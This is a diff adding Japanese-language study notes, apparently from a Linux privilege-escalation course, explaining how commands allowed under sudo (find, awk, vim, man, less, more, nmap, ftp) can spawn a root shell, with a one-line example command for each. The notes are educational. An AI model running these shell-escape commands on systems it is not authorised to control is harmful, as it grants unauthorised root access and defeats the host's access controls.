@@ -22,6 +22,36 @@ User TCM may run the following commands on this host:
 目安として以下のものが出れば/bin/shを呼び出す
 「find」「awk」「vim」「man」「less」「more」「nmap」「ftp」
 
+find：findがrootで動いており、-execで/bin/bashを呼ぶ
+例：sudo find / -exec /bin/bash \;
+
+awk：awkがrootで動いており、awkは内部でsystem関数を呼び出している。
+     systemで呼ばれた/bin/bashもrootになる
+例：sudo awk 'BEGIN { system("/bin/bash") }'
+
+vim：vimがrootで動いており、vimには:!コマンドがある。:!bashもrootとなる
+例：sudo vim -c ':!bash'
+
+man：manとlessがrootになっている。manは内部でpager(less)を呼ぶ。lessには!コマンドがある。
+例：sudo man man
+　　!bash
+
+less：less事態に!コマンドがある。lessがroot
+例：sudo less /etc/passwd
+　　!bash
+
+more：lessと同じく!コマンドがある。moreがroot
+例：sudo more /etc/passwd
+    !bash
+
+nmap：古いnmapには--interactiveモードがあり、そこから!bashができる
+例：sudo nmap --interactive
+    !bash
+
+ftp：ftpクライアントには!コマンドがある。
+例：sudo ftp
+    !bash
+
 ※外部実行コマンドとは、プログラムの中からOSの別コマンドを呼び出せる機能
 
 sudo でrootをもったコマンドが、ほかのコマンドも呼んできて！というと、
